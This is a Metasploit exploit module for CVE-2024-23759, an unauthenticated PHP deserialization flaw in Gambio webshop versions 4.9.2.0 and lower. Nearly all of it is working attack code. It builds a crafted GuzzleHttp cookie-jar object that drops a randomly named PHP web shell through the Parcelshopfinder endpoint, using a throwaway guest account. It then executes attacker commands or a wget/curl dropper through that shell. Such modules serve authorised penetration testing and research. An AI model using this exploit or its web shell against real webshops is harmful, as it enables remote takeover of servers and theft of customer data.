##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gambio Online Webshop unauthenticated PHP Deserialization Vulnerability',
        'Description' => %q{
          A Remote Code Execution vulnerability in Gambio online webshop version 4.9.2.0 and lower
          allows remote attackers to run arbitrary commands via unauthenticated HTTP POST request.
          The identified vulnerability within Gambio pertains to an insecure deserialization flaw,
          which ultimately allows an attacker to execute remote code on affected systems.
          The insecure deserialization vulnerability in Gambio poses a significant risk to affected systems.
          As it allows remote code execution, adversaries could exploit this flaw to execute arbitrary commands,
          potentially resulting in complete system compromise, data exfiltration, or unauthorized access
          to sensitive information.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'usd Herolab' # Discovery of the vulnerability
        ],
        'References' => [
          ['CVE', '2024-23759'],
          ['URL', 'https://attackerkb.com/topics/cxCsICfcDY/cve-2024-23759'],
          ['URL', 'https://herolab.usd.de/en/security-advisories/usd-2023-0046/']
        ],
        'DisclosureDate' => '2024-01-19',
        'Platform' => ['php', 'unix', 'linux'],
        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_X64, ARCH_X86],
        'Privileged' => false,
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => ['php'],
              'Arch' => ARCH_PHP,
              'Type' => :php
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => ['linux'],
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget', 'curl', 'bourne', 'printf', 'echo'],
              'Linemax' => 16384
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'The Gambia Webshop endpoint URL', '/' ]),
      OptString.new('WEBSHELL', [false, 'Set webshell name without extension. Name will be randomly generated if left unset.', nil]),
      OptEnum.new('COMMAND',
                  [true, 'Use PHP command function', 'passthru', %w[passthru shell_exec system exec]], conditions: %w[TARGET != 0])
    ])
  end

  def execute_php(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, @webshell_name),
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def execute_command(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    php_cmd_function = datastore['COMMAND']
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, @webshell_name),
      'vars_get' => {
        @get_param => php_cmd_function
      },
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def upload_webshell
    # randomize file name if option WEBSHELL is not set
    @webshell_name = (datastore['WEBSHELL'].blank? ? "#{Rex::Text.rand_text_alpha(8..16)}.php" : "#{datastore['WEBSHELL']}.php")

    # randomize e-mail address, firstname and lastname to be used in payload and POST requests
    email = Rex::Text.rand_mail_address
    email_array = email.split('@')
    domain = email_array[1]
    firstname = email_array[0].split('.')[0]
    lastname = email_array[0].split('.')[1]
    hostname = Rex::Text.rand_hostname

    # Upload webshell with PHP payload
    @post_param = Rex::Text.rand_text_alphanumeric(1..8)
    @get_param = Rex::Text.rand_text_alphanumeric(1..8)

    if target['Type'] == :php
      php_payload = "<?php @eval(base64_decode($_POST[\'#{@post_param}\']));?>"
    else
      php_payload = "<?=$_GET[\'#{@get_param}\'](base64_decode($_POST[\'#{@post_param}\']));?>"
    end

    php_payload_len = php_payload.length
    webshell_name_len = @webshell_name.length
    domain_len = domain.length
    hostname_len = hostname.length
    final_payload = "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{s:36:\"\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"\x00GuzzleHttp\\Cookie\\SetCookie\x00data\";a:9:{s:7:\"Expires\";i:1;s:7:\"Discard\";b:0;s:5:\"Value\";s:#{php_payload_len}:\"#{php_payload}\";s:4:\"Path\";s:1:\"/\";s:4:\"Name\";s:#{hostname_len}:\"#{hostname}\";s:6:\"Domain\";s:#{domain_len}:\"#{domain}\";s:6:\"Secure\";b:0;s:8:\"Httponly\";b:0;s:7:\"Max-Age\";i:3;}}}s:39:\"\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode\";N;s:41:\"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename\";s:#{webshell_name_len}:\"#{@webshell_name}\";s:52:\"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies\";b:1;}"
    final_payload_b64 = Base64.strict_encode64(final_payload)

    # create guest user to get a valid session cookie
    # country variable should match with a configured tax country in the gambio admin panel
    # grab the available tax country code settings from the CreateGuest form page
    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'shop.php?do=CreateGuest')
    })
    if res && res.code == 200
      html = res.get_html_document
      unless html.blank?
        country_tax_options = html.css('select[@id="country"]')
        country_tax_options.css('option').each do |country|
          vprint_status("Application's tax country code setting required for exploitation: #{country['value']}")
          res = send_request_cgi({
            'method' => 'POST',
            'uri' => normalize_uri(target_uri.path, 'shop.php?do=CreateGuest/Proceed'),
            'keep_cookies' => true,
            'vars_post' => {
              'firstname' => firstname,
              'lastname' => lastname,
              'email_address' => email,
              'email_address_confirm' => email,
              'b2b_status' => 0,
              'company' => nil,
              'vat' => nil,
              'street_address' => Rex::Text.rand_text_alpha_lower(8..12),
              'postcode' => Rex::Text.rand_text_numeric(5),
              'city' => Rex::Text.rand_text_alpha_lower(4..12),
              'country' => country['value'],
              'telephone' => Rex::Text.rand_text_numeric(10),
              'fax' => nil,
              'action' => 'process'
            }
          })
          next unless res && res.code == 302

          res = send_request_cgi({
            'method' => 'POST',
            'uri' => normalize_uri(target_uri.path, 'shop.php?do=Parcelshopfinder/AddAddressBookEntry'),
            'keep_cookies' => true,
            'vars_post' => {
              'checkout_started' => 0,
              'search' => final_payload_b64,
              'street_address' => Rex::Text.rand_text_alpha_lower(4..12),
              'house_number' => Rex::Text.rand_text_numeric(1..2),
              'additional_info' => nil,
              'postcode' => Rex::Text.rand_text_numeric(5),
              'city' => Rex::Text.rand_text_alpha_lower(8..12),
              'country' => 'DE',
              'firstname' => firstname,
              'lastname' => lastname,
              'postnumber' => Rex::Text.rand_text_numeric(6),
              'psf_name' => Rex::Text.rand_text_alpha_lower(1..3)
            }
          })
          break
        end
      end
    end
    res
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    res = send_request_cgi!({
      'method' => 'GET',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path)
    })
    return CheckCode::Unknown('No valid response received from target.') unless res && res.code == 200

    # Check if target is running a Gambio webshop
    # Search for "Gambio" on the login page
    return CheckCode::Safe unless res.body.include?('gambio')

    CheckCode::Detected('It looks like Gambio Webshop is running.')
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    res = upload_webshell
    fail_with(Failure::PayloadFailed, 'Web shell upload error.') unless res && res.code == 500
    register_file_for_cleanup(@webshell_name)

    case target['Type']
    when :php
      execute_php(payload.encoded)
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager({ linemax: target.opts['Linemax'] })
    end
  end
end
